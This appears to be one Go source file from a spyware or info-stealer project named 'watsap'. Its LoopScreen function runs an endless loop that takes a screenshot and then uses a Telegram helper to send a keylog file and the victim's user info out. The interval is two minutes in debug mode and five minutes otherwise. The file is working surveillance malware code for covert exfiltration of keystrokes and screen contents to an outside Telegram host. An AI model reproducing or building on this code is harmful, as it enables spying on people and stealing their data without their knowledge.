package screen

import (
	"time"
	"watsap/utils/config"
	"watsap/utils/messages"
	"watsap/utils/telegram"
)

// to-do: try better approach
func LoopScreen() {
	if config.DebugMode {
		config.Logger("[Screen] Starting screenshot plugin", "default")
	}
	for {
		InitScreen()
		telegram.TgSendFile(config.KeylogFile, messages.GetUserInfoMsg())
		if config.DebugMode {
			time.Sleep(2 * time.Minute)
		} else {
			time.Sleep(5 * time.Minute)
		}
	}

}
